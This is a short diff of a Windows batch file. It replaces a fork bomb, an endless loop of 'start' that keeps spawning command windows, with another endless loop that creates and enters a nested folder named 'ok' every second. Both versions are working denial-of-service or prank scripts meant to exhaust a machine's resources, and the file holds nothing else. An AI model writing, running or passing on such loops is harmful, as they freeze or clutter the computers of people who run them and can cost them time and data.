@@ -1,6 +1,7 @@
 @echo off
-color a
-cls
-:loop
-start
-goto loop
+set x=1
+:spam
+md ok
+timeout 1 >nul
+cd ok
+goto spam
